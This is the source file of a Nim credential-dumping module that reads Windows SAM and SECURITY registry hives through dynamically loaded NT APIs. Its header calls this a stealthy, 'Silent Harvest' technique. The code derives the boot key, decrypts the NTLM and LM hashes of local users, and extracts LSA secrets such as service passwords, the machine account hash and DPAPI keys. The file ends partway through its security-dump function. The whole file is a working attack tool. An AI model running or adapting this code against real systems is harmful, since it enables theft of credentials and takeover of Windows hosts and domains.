## hashdump - SAM/Security hive credential dumper using Silent Harvest technique
## Based on SilentNimvest by @R0h1rr1m
## Uses NtOpenKeyEx + RegQueryMultipleValuesW for stealthy registry access

import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, strutils, sequtils]

when defined(windows):
  import winim/lean
  import nimcrypto
  import checksums/md5
  import des/des

  # ============================================================
  # Types & Structs (from SilentNimvest/Structs.nim)
  # ============================================================

  type
    KEY_INFORMATION_CLASS = enum
      KeyBasicInformation,
      KeyNodeInformation,
      KeyFullInformation,
      KeyNameInformation,
      KeyCachedInformation,
      KeyFlagsInformation,
      KeyVirtualizationInformation,
      KeyHandleTagsInformation,
      KeyTrustInformation,
      KeyLayerInformation,
      MaxKeyInfoClass

    KEY_VALUE_INFORMATION_CLASS = enum
      KeyValueBasicInformation,
      KeyValueFullInformation,
      KeyValuePartialInformation

    KEY_NODE_INFORMATION_STRUCT {.bycopy.} = object
      LastWriteTime: LARGE_INTEGER
      TitleIndex: ULONG
      ClassOffset: ULONG
      ClassLength: ULONG
      NameLength: ULONG
      Name: array[1, WCHAR]

    KEY_VALUE_BASIC_INFORMATION_STRUCT {.bycopy.} = object
      TitleIndex: ULONG
      Type: ULONG
      NameLength: ULONG
      Name: array[1, WCHAR]

    PKEY_NODE_INFORMATION = ptr KEY_NODE_INFORMATION_STRUCT

    KEY_BASIC_INFORMATION_STRUCT {.pure.} = object
      LastWriteTime: LARGE_INTEGER
      TitleIndex: ULONG
      NameLength: ULONG
      Name: array[1, WCHAR]

    PKEY_BASIC_INFORMATION = ptr KEY_BASIC_INFORMATION_STRUCT

    NlRecord = object
      UserLength: int16
      DomainNameLength: int16
      DnsDomainLength: int16
      Iv: seq[byte]
      EncryptedData: seq[byte]

    LsaSecretBlob = object
      Length: uint32
      Unk: seq[byte]
      Secret: seq[byte]
      SecretString: wstring

  # ============================================================
  # Dynamic function types (from SilentNimvest/Main.nim)
  # ============================================================

  type
    NtOpenKeyExType = proc(KeyHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, OpenOptions: ULONG): NTSTATUS {.stdcall.}
    NtQueryKeyType = proc(KeyHandle: HANDLE, KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID, Length: ULONG, ResultLength: PULONG): NTSTATUS {.stdcall.}
    RegQueryMultipleValuesWType = proc(hKey: HKEY, val_list: PVALENTW, num_vals: DWORD, lpValueBuf: LPWSTR, ldwTotsize: LPDWORD): LSTATUS {.stdcall.}
    NtEnumerateKeyType = proc(KeyHandle: HANDLE, Index: ULONG, KeyInformationClass: KEY_INFORMATION_CLASS, KeyInformation: PVOID, Length: ULONG, ResultLength: PULONG): NTSTATUS {.stdcall.}
    NtEnumerateValueKeyType = proc(KeyHandle: HANDLE, Index: ULONG, KeyValueInformationClass: KEY_VALUE_INFORMATION_CLASS, KeyValueInformation: PVOID, Length: ULONG, ResultLength: PULONG): NTSTATUS {.stdcall.}
    NtCloseType = proc(KeyHandle: HANDLE): NTSTATUS {.stdcall.}

  # Module-level proc pointers
  var
    NtOpenKeyExProc: NtOpenKeyExType = nil
    RegQueryMultipleValuesWProc: RegQueryMultipleValuesWType = nil
    NtQueryKeyProc: NtQueryKeyType = nil
    NtEnumerateKeyProc: NtEnumerateKeyType = nil
    NtEnumerateValueKeyProc: NtEnumerateValueKeyType = nil
    NtCloseProc: NtCloseType = nil

  # ============================================================
  # Utility procs (from SilentNimvest/Utility.nim)
  # ============================================================

  proc seqToUnicode(input: seq[byte]): string =
    var index: int = 0
    var returnValue = newWString(0)
    while index < input.len:
      returnValue.add(cast[WCHAR](input[index]))
      index = index + 2
    return $returnValue

  proc hexStringToByteArray(s: string): seq[byte] =
    var i = 0
    result = newSeq[byte](0)
    while i < s.len:
      result.add(parseHexInt(s[i .. i+1]).byte)
      i += 2

  # ============================================================
  # Crypto procs (from SilentNimvest/Crypto.nim)
  # ============================================================

  proc computeSha256(key: seq[byte], value: seq[byte]): seq[byte] =
    var shaBase = newSeq[byte](0)
    shaBase.add(key)
    for i in countup(0, 999):
      shaBase.add(value[0..<32])
    var ctx: sha256
    ctx.init()
    ctx.update(addr shaBase[0], uint(shaBase.len))
    let digest = ctx.finish()
    var returnValue = newSeq[byte](32)
    copyMem(addr returnValue[0], unsafeAddr digest.data[0], 32)
    return returnValue

  proc rc4Encrypt(key: seq[byte], data: seq[byte]): seq[byte] =
    var S = newSeq[int](256)
    var K = newSeq[int](256)
    var j: int = 0
    var tempVal: int = 0
    var returnValue: seq[byte] = @[]
    for i in 0 .. 255:
      S[i] = i
      K[i] = int(key[i mod key.len])
    for i in 0 .. 255:
      j = (j + S[i] + K[i]) mod 256
      tempVal = S[i]
      S[i] = S[j]
      S[j] = tempVal
    var i = 0
    j = 0
    for c in data:
      i = (i + 1) mod 256
      j = (j + S[i]) mod 256
      tempVal = S[i]
      S[i] = S[j]
      S[j] = tempVal
      returnValue.add(cast[byte](cast[int](c) xor S[(S[i] + S[j]) mod 256]))
    return returnValue

  proc transformKey(inputData: seq[byte]): seq[byte] =
    result.add(byte(((inputData[0] shr 1) and 0x7f) shl 1))
    result.add(byte(((inputData[0] and 0x01) shl 6 or ((inputData[1] shr 2) and 0x3f)) shl 1))
    result.add(byte(((inputData[1] and 0x03) shl 5 or ((inputData[2] shr 3) and 0x1f)) shl 1))
    result.add(byte(((inputData[2] and 0x07) shl 4 or ((inputData[3] shr 4) and 0x0f)) shl 1))
    result.add(byte(((inputData[3] and 0x0f) shl 3 or ((inputData[4] shr 5) and 0x07)) shl 1))
    result.add(byte(((inputData[4] and 0x1f) shl 2 or ((inputData[5] shr 6) and 0x03)) shl 1))
    result.add(byte(((inputData[5] and 0x3f) shl 1 or ((inputData[6] shr 7) and 0x01)) shl 1))
    result.add(byte((inputData[6] and 0x7f) shl 1))

  proc ridToKey(hexRid: string): tuple[key1: seq[byte], key2: seq[byte]] =
    let rid = parseHexInt(hexRid).uint32
    var temp1: seq[byte]
    temp1.add(byte(rid and 0xFF))
    temp1.add(byte((rid shr 8) and 0xFF))
    temp1.add(byte((rid shr 16) and 0xFF))
    temp1.add(byte((rid shr 24) and 0xFF))
    temp1.add(temp1[0])
    temp1.add(temp1[1])
    temp1.add(temp1[2])
    var temp2: seq[byte]
    temp2.add(temp1[3])
    temp2.add(temp1[0])
    temp2.add(temp1[1])
    temp2.add(temp1[2])
    temp2.add(temp2[0])
    temp2.add(temp2[1])
    temp2.add(temp2[2])
    result.key1 = transformKey(temp1)
    result.key2 = transformKey(temp2)

  proc deObfuscateHashPart(obfuscatedHash: seq[byte], key: seq[byte]): seq[byte] =
    var desCrypter = newDesCipher(key)
    desCrypter.setIV(@[byte 0, 0, 0, 0, 0, 0, 0, 0])
    var output = newSeq[byte](8)
    desCrypter.decrypt(obfuscatedHash, output, modeECB)
    return output

  proc decryptSingleHash(obfuscatedHash: seq[byte], user: string): string =
    let (key1, key2) = ridToKey(user)
    let hashBytes1 = obfuscatedHash[0 ..< 8]
    let hashBytes2 = obfuscatedHash[8 ..< 16]
    let plain1 = deObfuscateHashPart(hashBytes1, key1)
    let plain2 = deObfuscateHashPart(hashBytes2, key2)
    for b in plain1: result.add(b.toHex(2))
    for b in plain2: result.add(b.toHex(2))

  proc pad(data: int): int =
    if ((data and 0x3) > 0):
      return (data + (data and 0x3))
    else:
      return data

  proc decryptAES_CBC(encryptedData: seq[byte], key: seq[byte], iv: seq[byte]): seq[byte] =
    var
      dctx_cbc: CBC[aes128]
      decryptedCBC: seq[byte]
      tailLength: int = encryptedData.len mod 16
      mutableEncryptedData: seq[byte]
    mutableEncryptedData = newSeq[byte](encryptedData.len)
    copyMem(addr mutableEncryptedData[0], unsafeAddr encryptedData[0], encryptedData.len)
    if (tailLength != 0):
      for i in countup(0, 16 - tailLength - 1):
        mutableEncryptedData.add(@[byte 0x00])
    decryptedCBC = newSeq[byte](mutableEncryptedData.len)
    dctx_cbc.init(unsafeAddr key[0], unsafeAddr iv[0])
    dctx_cbc.decrypt(addr mutableEncryptedData[0], addr decryptedCBC[0], cast[uint](mutableEncryptedData.len))
    dctx_cbc.clear()
    return decryptedCBC

  proc md4Hash2(input: seq[byte]): seq[byte] =
    var bytes = input
    let bitCount = uint32(bytes.len) * 8
    bytes.add(0x80'u8)
    while bytes.len mod 64 != 56:
      bytes.add(0'u8)
    var uints: seq[uint32]
    var i = 0
    while i + 3 < bytes.len:
      uints.add(uint32(bytes[i]) or
                uint32(bytes[i+1]) shl 8 or
                uint32(bytes[i+2]) shl 16 or
                uint32(bytes[i+3]) shl 24)
      i += 4
    uints.add(bitCount)
    uints.add(0'u32)
    var a = 0x67452301'u32
    var b = 0xefcdab89'u32
    var c = 0x98badcfe'u32
    var d = 0x10325476'u32
    template rol(x, y: uint32): uint32 =
      (x shl int(y)) or (x shr (32 - int(y)))
    var q = 0
    while q + 15 < uints.len:
      let chunk = uints[q ..< q + 16]
      let aa = a; let bb = b; let cc = c; let dd = d
      template doRound(f: untyped, ivals: array[4, uint32],
                       ki: array[4, uint32], s: array[4, uint32], constant: uint32) =
        for idx in 0 ..< 4:
          let iv = ivals[idx]
          a = rol(a + f(b, c, d) + chunk[int(iv + ki[0])] + constant, s[0])
          d = rol(d + f(a, b, c) + chunk[int(iv + ki[1])] + constant, s[1])
          c = rol(c + f(d, a, b) + chunk[int(iv + ki[2])] + constant, s[2])
          b = rol(b + f(c, d, a) + chunk[int(iv + ki[3])] + constant, s[3])
      template f1(x, y, z: uint32): uint32 = (x and y) or (not x and z)
      template f2(x, y, z: uint32): uint32 = (x and y) or (x and z) or (y and z)
      template f3(x, y, z: uint32): uint32 = x xor y xor z
      doRound(f1, [0'u32, 4, 8, 12], [0'u32, 1, 2, 3], [3'u32, 7, 11, 19], 0'u32)
      doRound(f2, [0'u32, 1, 2, 3], [0'u32, 4, 8, 12], [3'u32, 5, 9, 13], 0x5a827999'u32)
      doRound(f3, [0'u32, 2, 1, 3], [0'u32, 8, 4, 12], [3'u32, 9, 11, 15], 0x6ed9eba1'u32)
      a += aa; b += bb; c += cc; d += dd
      q += 16
    for val in [a, b, c, d]:
      result.add(byte(val and 0xff))
      result.add(byte((val shr 8) and 0xff))
      result.add(byte((val shr 16) and 0xff))
      result.add(byte((val shr 24) and 0xff))

  # ============================================================
  # Struct helper procs
  # ============================================================

  proc initNlRecord(data: seq[byte]): NlRecord =
    result.UserLength = cast[int16]([data[0], data[1]])
    result.DomainNameLength = cast[int16]([data[2], data[3]])
    result.DnsDomainLength = cast[int16]([data[60], data[61]])
    result.Iv = data[64 ..< 64+16]
    result.EncryptedData = data[96 ..< 96+data.len-96]

  proc newLsaSecretBlob(inputData: seq[byte]): LsaSecretBlob =
    let slice = inputData[0..<4]
    var index: int = 0
    result.Length = (cast[ptr uint32](unsafeAddr slice[0]))[]
    result.Unk = inputData[4 ..< 16]
    result.Secret = inputData[16 ..< 16 + result.Length]
    result.SecretString = newWString(0)
    while index < result.Secret.len:
      result.SecretString.add(cast[WCHAR](result.Secret[index]))
      index = index + 2

  # ============================================================
  # Core registry operations
  # ============================================================

  proc dynamicallyLoadFunctions(): bool =
    var
      ntdllHandle: HMODULE
      advapi32Handle: HMODULE
    ntdllHandle = LoadLibraryA("ntdll.dll")
    advapi32Handle = LoadLibraryA("advapi32.dll")
    let ntOpenKeyExAddr = GetProcAddress(ntdllHandle, "NtOpenKeyEx")
    if ntOpenKeyExAddr == cast[FARPROC](0):
      return false
    let regQueryMultipleValuesWAddr = GetProcAddress(advapi32Handle, "RegQueryMultipleValuesW")
    if regQueryMultipleValuesWAddr == cast[FARPROC](0):
      return false
    let ntQueryKeyAddr = GetProcAddress(ntdllHandle, "NtQueryKey")
    if ntQueryKeyAddr == cast[FARPROC](0):
      return false
    let ntEnumerateKeyAddr = GetProcAddress(ntdllHandle, "NtEnumerateKey")
    if ntEnumerateKeyAddr == cast[FARPROC](0):
      return false
    let ntEnumerateValueKeyAddr = GetProcAddress(ntdllHandle, "NtEnumerateValueKey")
    if ntEnumerateValueKeyAddr == cast[FARPROC](0):
      return false
    let ntCloseAddr = GetProcAddress(ntdllHandle, "NtClose")
    if ntCloseAddr == cast[FARPROC](0):
      return false
    NtOpenKeyExProc = cast[NtOpenKeyExType](ntOpenKeyExAddr)
    RegQueryMultipleValuesWProc = cast[RegQueryMultipleValuesWType](regQueryMultipleValuesWAddr)
    NtQueryKeyProc = cast[NtQueryKeyType](ntQueryKeyAddr)
    NtEnumerateKeyProc = cast[NtEnumerateKeyType](ntEnumerateKeyAddr)
    NtEnumerateValueKeyProc = cast[NtEnumerateValueKeyType](ntEnumerateValueKeyAddr)
    NtCloseProc = cast[NtCloseType](ntCloseAddr)
    return true

  proc setPrivilege(lpszPrivilege: LPCSTR): bool =
    var
      tp: TOKEN_PRIVILEGES
      luid: LUID
      hToken: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, addr hToken) == 0:
      return false
    if LookupPrivilegeValueA(nil, lpszPrivilege, addr luid) == 0:
      return false
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    if AdjustTokenPrivileges(hToken, FALSE, addr tp, cast[DWORD](sizeof(tp)), nil, nil) == 0:
      return false
    if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
      return false
    CloseHandle(hToken)
    return true

  proc openRegistryWithNtOpenKeyEx(keyString: PCWSTR): tuple[handle: HANDLE, success: bool] =
    var
      keyUnicode: UNICODE_STRING
      objectAttributes: OBJECT_ATTRIBUTES
      openOptions: ULONG
      ntStatus: NTSTATUS
      returnHandle: HANDLE
    RtlInitUnicodeString(addr(keyUnicode), keyString)
    InitializeObjectAttributes(addr(objectAttributes), addr(keyUnicode), OBJ_CASE_INSENSITIVE, 0, nil)
    openOptions = REG_OPTION_BACKUP_RESTORE or REG_OPTION_OPEN_LINK
    ntStatus = NtOpenKeyExProc(addr returnHandle, KEY_READ, addr objectAttributes, openOptions)
    if ntStatus != 0:
      return (0.HANDLE, false)
    return (returnHandle, true)

  proc enumerateValueNames(hKey: HANDLE): seq[string] =
    var
      returnValue: seq[string] = @[]
      index: ULONG = 0
      resultLength: ULONG = 0
      buffer: seq[byte]
      status: NTSTATUS
      info: ptr KEY_VALUE_BASIC_INFORMATION_STRUCT
      namePtr: ptr WCHAR
      name: string
    while true:
      discard NtEnumerateValueKeyProc(hKey, index, KeyValueBasicInformation, nil, 0, addr resultLength)
      if resultLength == 0:
        break
      buffer = newSeq[byte](resultLength)
      status = NtEnumerateValueKeyProc(hKey, index, KeyValueBasicInformation, addr buffer[0], resultLength, addr resultLength)
      if status != 0:
        break
      info = cast[ptr KEY_VALUE_BASIC_INFORMATION_STRUCT](addr buffer[0])
      namePtr = cast[ptr WCHAR](addr info.Name)
      name = $cast[WideCString](namePtr)
      if cmpIgnoreCase(name, "NL$Control") != 0:
        returnValue.add(name)
      inc index
    return returnValue

  proc getValueWithRegQueryMultipleValuesW(keyHandle: HANDLE, valueString: string): tuple[data: seq[byte], success: bool] =
    var
      values: array[1, VALENTW]
      buffer: seq[byte]
      slice: seq[byte]
      bufferSize: DWORD
      returnValue: LSTATUS
    values[0].ve_valuename = valueString.newWideCString()
    bufferSize = 0
    returnValue = RegQueryMultipleValuesW(keyHandle, addr values[0], 1, nil, addr bufferSize)
    if returnValue != ERROR_MORE_DATA or bufferSize == 0:
      return (@[], false)
    buffer = newSeq[byte](bufferSize)
    returnValue = RegQueryMultipleValuesW(keyHandle, addr values[0], 1, cast[LPWSTR](addr buffer[0]), addr bufferSize)
    if returnValue != 0:
      return (@[], false)
    if values[0].ve_valuelen > 0:
      let offset = values[0].ve_valueptr.int - cast[int](addr buffer[0])
      if offset >= 0 and offset + values[0].ve_valuelen.int <= buffer.len:
        slice = buffer[offset ..< offset + values[0].ve_valuelen.int]
        return (slice, true)
    return (@[], true)

  # ============================================================
  # Boot key / SAM key operations
  # ============================================================

  proc getBootKey(): tuple[key: seq[byte], error: string] =
    var
      keyValue: string
      regHandle: HANDLE
      bufferSize: ULONG
      returnValue: NTSTATUS
      buffer: seq[byte]
      returnBuffer: seq[byte] = newSeq[byte](16)
      scrambledByteArray: seq[byte]
      keyClassInfoPtr: PKEY_NODE_INFORMATION
      pClass: ptr UncheckedArray[WCHAR]
      classCharLen: ULONG
      classStr: string = ""
    let permutationMatrix = [byte 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
    let keyLocations = ["JD", "Skew1", "GBG", "Data"]
    let mainRegLocation = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
    for keyLocation in keyLocations:
      keyValue = mainRegLocation & keyLocation
      let (handle, success) = openRegistryWithNtOpenKeyEx(keyValue)
      if not success:
        return (@[], "Failed to open registry key: " & keyValue)
      regHandle = handle
      bufferSize = 0
      returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, NULL, 0, addr bufferSize)
      if bufferSize == 0:
        discard NtCloseProc(regHandle)
        return (@[], "Failed to read buffer size for " & keyValue)
      buffer = newSeq[byte](bufferSize)
      returnValue = NtQueryKeyProc(regHandle, KeyNodeInformation, cast[PVOID](addr buffer[0]), bufferSize, addr bufferSize)
      discard NtCloseProc(regHandle)
      if returnValue != 0:
        return (@[], "Failed to get value for " & keyValue)
      keyClassInfoPtr = cast[PKEY_NODE_INFORMATION](addr buffer[0])
      if keyClassInfoPtr.ClassLength > 0:
        pClass = cast[ptr UncheckedArray[WCHAR]](cast[uint64](addr buffer[0]) + cast[uint64](keyClassInfoPtr.ClassOffset))
        classCharLen = keyClassInfoPtr.ClassLength div cast[ULONG](sizeof(WCHAR))
        for i in 0 ..< classCharLen.int:
          classStr.add(cast[char](pClass[i]))
    scrambledByteArray = hexStringToByteArray(classStr)
    for i in countup(0, 15):
      returnBuffer[i] = scrambledByteArray[permutationMatrix[i]]
    return (returnBuffer, "")

  proc getSysKey(): tuple[data: seq[byte], error: string] =
    let (handle, success) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account")
    if not success:
      return (@[], "Failed to open SAM\\Domains\\Account key")
    let (returnByte, readSuccess) = getValueWithRegQueryMultipleValuesW(handle, "F")
    discard NtCloseProc(handle)
    if not readSuccess:
      return (@[], "Failed to read F value from SAM")
    return (returnByte, "")

  proc getHashedBootKey(fVal: seq[byte], bootKey: seq[byte]): tuple[key: seq[byte], error: string] =
    let domainData = fVal[104 ..< fVal.len]
    # Old style hashed bootkey storage
    if domainData[0] == 0x01:
      let f70: seq[byte] = fVal[112 ..< 112+16]
      var data: seq[byte] = @[]
      data.add(f70)
      data.add(cast[seq[byte]]("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"))
      data.add(bootKey)
      data.add(cast[seq[byte]]("0123456789012345678901234567890123456789\0"))
      var md5ContextVar: MD5Context
      var md5DigestVar: MD5Digest
      md5ContextVar.md5Init()
      md5ContextVar.md5Update(data)
      md5ContextVar.md5Final(md5DigestVar)
      let md5bytes = newSeq[byte](16)
      copyMem(addr md5bytes[0], addr md5DigestVar[0], 16)
      let f80 = fVal[128 ..< 128+32]
      return (rc4Encrypt(md5bytes, f80), "")
    # New version -- Win 2016 / Win 10 and above
    elif domainData[0] == 0x02:
      var dctx: CBC[aes128]
      var sk_Salt_AES = domainData[16 ..< 16+16]
      var sk_Data_Length = (cast[ptr int32](unsafeAddr domainData[12]))[]
      var sk_Data_AES = domainData[32 ..< 32 + sk_Data_Length]
      var decText = newSeq[byte](sk_Data_Length)
      dctx.init(unsafeAddr bootKey[0], addr sk_Salt_AES[0])
      dctx.decrypt(addr sk_Data_AES[0], addr decText[0], cast[uint](sk_Data_Length))
      dctx.clear()
      return (decText, "")
    else:
      return (@[], "Error parsing hashed bootkey - unknown version")

  # ============================================================
  # LSA Secret Dump
  # ============================================================

  proc dumpSecret(keyLocation: string, decryptedLsaKey: seq[byte]): tuple[data: seq[byte], error: string] =
    let (hKey, success) = openRegistryWithNtOpenKeyEx(keyLocation)
    if not success:
      return (@[], "Failed to open key: " & keyLocation)
    let (value, readSuccess) = getValueWithRegQueryMultipleValuesW(hKey, "")
    if not readSuccess:
      discard NtCloseProc(hKey)
      return (@[], "Failed to read value from: " & keyLocation)
    var
      tempKey: seq[byte]
      valueData: seq[byte]
      valueDataVal2: seq[byte]
      returnValue: seq[byte]
      dctx: ECB[aes256]
    valueData = value[28..<value.len]
    tempKey = computeSha256(decryptedLsaKey, valueData[0..<32])
    valueDataVal2 = valueData[32..<32+valueData.len-32]
    dctx.init(tempKey)
    returnValue = newSeq[byte](valueDataVal2.len)
    dctx.decrypt(valueDataVal2, returnValue)
    dctx.clear()
    discard NtCloseProc(hKey)
    return (returnValue, "")

  proc getServiceUsername(targetService: string): string =
    let scMgrHandle = OpenSCManager(NULL, NULL, 0xF003F)
    let svcHandle = OpenService(scMgrHandle, targetService, SERVICE_QUERY_CONFIG)
    if svcHandle != 0:
      var bytesNeeded: DWORD = 0
      discard QueryServiceConfig(svcHandle, nil, 0, addr bytesNeeded)
      let qscPtr = newSeq[byte](bytesNeeded)
      if QueryServiceConfig(svcHandle, cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0]), bytesNeeded, addr bytesNeeded):
        let serviceInfo = cast[LPQUERY_SERVICE_CONFIG](addr qscPtr[0])
        CloseServiceHandle(svcHandle)
        CloseServiceHandle(scMgrHandle)
        return $serviceInfo.lpServiceStartName
    CloseServiceHandle(svcHandle)
    CloseServiceHandle(scMgrHandle)
    return "unknownUser"

  proc formatLsaSecret(keyName: string, secretBlob: LsaSecretBlob): string =
    if keyName.toUpper().startsWith("_SC_"):
      let userName = getServiceUsername(keyName[4..<keyName.len])
      return "Plaintext User from " & keyName & " service: " & userName & ":" & $secretBlob.SecretString
    elif keyName.toUpper().startsWith("$MACHINE.ACC"):
      let (handle, success) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters")
      if success:
        let (domainNameArr, _) = getValueWithRegQueryMultipleValuesW(handle, "Domain")
        var domainName = seqToUnicode(domainNameArr).replace("\0", "")
        let (computerNameArr, _) = getValueWithRegQueryMultipleValuesW(handle, "Hostname")
        var computerName = seqToUnicode(computerNameArr).replace("\0", "")
        let computerAcctHash = md4Hash2(secretBlob.Secret).mapIt(it.toHex(2)).join("").toLower()
        discard NtCloseProc(handle)
        return "Machine Account: " & domainName & "\\" & computerName & "$:aad3b435b51404eeaad3b435b51404ee:" & computerAcctHash
      return "Machine Account: (failed to read Tcpip\\Parameters)"
    elif keyName.toUpper().startsWith("DPAPI"):
      let machineStr = secretBlob.Secret[4..<4+20].mapIt(it.toHex(2)).join("").toLower()
      let userStr = secretBlob.Secret[24..<24+20].mapIt(it.toHex(2)).join("").toLower()
      return "DPAPI Keys: dpapi_machinekey: " & machineStr & " & dpapi_userkey: " & userStr
    elif keyName.toUpper().startsWith("NL$KM"):
      return "NL$KM: " & secretBlob.Secret.mapIt(it.toHex(2)).join("").toLower()
    elif keyName.toUpper().startsWith("ASPNET_WP_PASSWORD"):
      return "ASPNET: " & $secretBlob.SecretString
    else:
      return "Secret (" & keyName & "): " & secretBlob.Secret.mapIt(it.toHex(2)).join("").toLower()

  # ============================================================
  # SAM Dump
  # ============================================================

  proc getSAMDump(hashedBootKey: seq[byte]): tuple[output: string, error: string] =
    var
      output: string = ""
      index: ULONG = 0
      buf: seq[byte]
      status: NTSTATUS
      bufSize: ULONG
      pInfo: PKEY_BASIC_INFORMATION
      nameLen: ULONG
      name: string = ""
      pName: ptr UncheckedArray[WCHAR]
      listOfUserKeys: seq[string] = @[]

    let (hKey, success) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users")
    if not success:
      return ("", "Failed to open SAM\\Users key")
    
    while true:
      bufSize = 0
      status = NtEnumerateKeyProc(hKey, index, KeyBasicInformation, nil, 0, addr bufSize)
      if status == STATUS_NO_MORE_ENTRIES:
        break
      buf = newSeq[byte](bufSize)
      status = NtEnumerateKeyProc(hKey, index, KeyBasicInformation, cast[PVOID](addr buf[0]), bufSize, addr bufSize)
      if status == 0:
        pInfo = cast[PKEY_BASIC_INFORMATION](addr buf[0])
        nameLen = pInfo.NameLength div sizeof(WCHAR).ULONG
        pName = cast[ptr UncheckedArray[WCHAR]](addr pInfo.Name)
        name = ""
        for i in 0 ..< nameLen.int:
          name.add(cast[char](pName[i]))
        if name.startsWith("00000"):
          listOfUserKeys.add(name)
      inc index
    discard NtCloseProc(hKey)

    for userKey in listOfUserKeys:
      var
        lmHash = "aad3b435b51404eeaad3b435b51404ee"
        ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0"
        userRIDByteArray: array[4, byte]
        antpassword: seq[byte] = cast[seq[byte]]("NTPASSWORD\0")
        almpassword: seq[byte] = cast[seq[byte]]("LMPASSWORD\0")
        md5ContextVar: MD5Context
        md5DigestVar: MD5Digest

      let userRIDUint = parseHexInt(userKey).uint32
      copyMem(addr userRIDByteArray[0], cast[ptr byte](unsafeAddr userRIDUint), 4)

      let (userHandle, userSuccess) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\" & userKey)
      if not userSuccess:
        output.add("[!] Failed to open user key: " & userKey & "\n")
        continue
      let (vValueUser, vSuccess) = getValueWithRegQueryMultipleValuesW(userHandle, "V")
      discard NtCloseProc(userHandle)
      if not vSuccess or vValueUser.len < 204:
        output.add("[!] Failed to read V value for user: " & userKey & "\n")
        continue

      let offset = (cast[ptr int32](unsafeAddr vValueUser[12]))[] + 204
      let length = (cast[ptr int32](unsafeAddr vValueUser[16]))[]
      let lmHashOffset = (cast[ptr int32](unsafeAddr vValueUser[156]))[] + 204
      let lmHashLength = (cast[ptr int32](unsafeAddr vValueUser[160]))[]
      let ntHashOffset = (cast[ptr int32](unsafeAddr vValueUser[168]))[] + 204
      let ntHashLength = (cast[ptr int32](unsafeAddr vValueUser[172]))[]

      var usernameWstring = newWString(0)
      var idx: int = 0
      while idx < length:
        usernameWstring.add(cast[WCHAR](vValueUser[idx + offset]))
        idx = idx + 2

      if vValueUser[ntHashOffset + 2] == 0x01:
        # Old Style Hashing
        var lmKeyParts = newSeq[byte](0)
        var lmHashDecryptionKey = newSeq[byte](16)
        lmKeyParts.add(hashedBootKey[0..<16])
        lmKeyParts.add(userRIDByteArray)
        lmKeyParts.add(almpassword)
        md5ContextVar.md5Init()
        md5ContextVar.md5Update(lmKeyParts)
        md5ContextVar.md5Final(md5DigestVar)
        copyMem(addr lmHashDecryptionKey[0], addr md5DigestVar[0], 16)

        var ntKeyParts = newSeq[byte](0)
        var ntHashDecryptionKey = newSeq[byte](16)
        ntKeyParts.add(hashedBootKey[0..<16])
        ntKeyParts.add(userRIDByteArray)
        ntKeyParts.add(antpassword)
        md5ContextVar.md5Init()
        md5ContextVar.md5Update(ntKeyParts)
        md5ContextVar.md5Final(md5DigestVar)
        copyMem(addr ntHashDecryptionKey[0], addr md5DigestVar[0], 16)

        if ntHashLength == 20:
          let encryptedNtHash = vValueUser[ntHashOffset+4..<ntHashOffset+4+16]
          let obfuscatedNtHash = rc4Encrypt(ntHashDecryptionKey, encryptedNtHash)
          ntHash = decryptSingleHash(obfuscatedNtHash, userKey).replace("-", "")
        if lmHashLength == 20:
          let encryptedLmHash = vValueUser[lmHashOffset+4..<lmHashOffset+4+16]
          let obfuscatedLmHash = rc4Encrypt(lmHashDecryptionKey, encryptedLmHash)
          lmHash = decryptSingleHash(obfuscatedLmHash, userKey).replace("-", "")
      else:
        # New style (AES-based)
        let enc_LM_Hash = vValueUser[lmHashOffset..<lmHashOffset+lmHashLength]
        let lmData = enc_LM_Hash[24..<enc_LM_Hash.len]
        if lmData.len > 0:
          let slice = hashedBootKey[0..<16]
          let lmHashSalt = enc_LM_Hash[8..<8+16]
          let desEncryptedHash = decryptAES_CBC(lmData, slice, lmHashSalt)
          lmHash = decryptSingleHash(desEncryptedHash, userKey).replace("-", "")
        let enc_NT_Hash = vValueUser[ntHashOffset..<ntHashOffset+ntHashLength]
        let ntData = enc_NT_Hash[24..<enc_NT_Hash.len]
        if ntData.len > 0:
          let slice = hashedBootKey[0..<16]
          let ntHashSalt = enc_NT_Hash[8..<8+16]
          let desEncryptedHash = decryptAES_CBC(ntData, slice, ntHashSalt)
          ntHash = decryptSingleHash(desEncryptedHash, userKey).replace("-", "")

      let ridStr = $userRIDUint
      let hashes = lmHash.toLower() & ":" & ntHash.toLower()
      output.add("[*] " & $usernameWstring & ":" & ridStr & ":" & hashes & "\n")

    return (output, "")

  # ============================================================
  # Security Dump (Cached credentials + LSA secrets)
  # ============================================================

  proc getSecurityDump(): tuple[output: string, error: string] =
    var
      output: string = ""
      currValName: string = ""
      index: ULONG = 0
      buf: seq[byte]
      status: NTSTATUS
      bufSize: ULONG
      pInfo: PKEY_BASIC_INFORMATION
      nameLen: ULONG
      name: string = ""
      pName: ptr UncheckedArray[WCHAR]

    # Get boot key
    let (bootKey, bootKeyErr) = getBootKey()
    if bootKeyErr.len > 0:
      return ("", bootKeyErr)

    # Open SECURITY\\Policy\\PolEKList
    let (hKeyPolEK, polEKSuccess) = openRegistryWithNtOpenKeyEx("\\Registry\\Machine\\SECURITY\\Policy\\PolEKList")
    if not polEKSuccess:
      return ("", "Failed to open SECURITY\\Policy\\PolEKList - ensure running as Administrator")
